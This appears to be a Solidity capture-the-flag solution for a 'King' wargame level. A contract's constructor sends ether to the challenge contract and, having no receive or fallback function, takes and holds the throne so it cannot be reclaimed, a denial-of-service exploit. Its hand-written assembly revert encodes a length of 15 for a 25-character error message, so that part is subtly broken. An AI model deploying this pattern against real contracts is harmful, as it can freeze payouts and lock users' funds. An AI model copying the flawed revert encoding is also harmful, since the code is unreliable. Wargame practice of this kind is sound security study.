// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface King {}

contract KingHack {
    King king;

    constructor(address payable chal) payable {
        king = King(chal);
        // (bool success, ) = address(king).call{ value: msg.value }("");
        // require(success, "Call to attack has failed");
        assembly {
            let success := call(gas(), sload(0), callvalue(), 0, 0, 0, 0)

            if iszero(success) {
                let fmp := mload(0x40)
                mstore(fmp, "Error(string)")
                mstore(fmp, keccak256(fmp, 13))
                mstore(add(fmp, 4), 0x20)

                mstore(add(fmp, 0x24), 15)
                mstore(add(fmp, 0x44), "Call to attack has failed")

                revert(fmp, 0x64)
            }
        }
    }
}
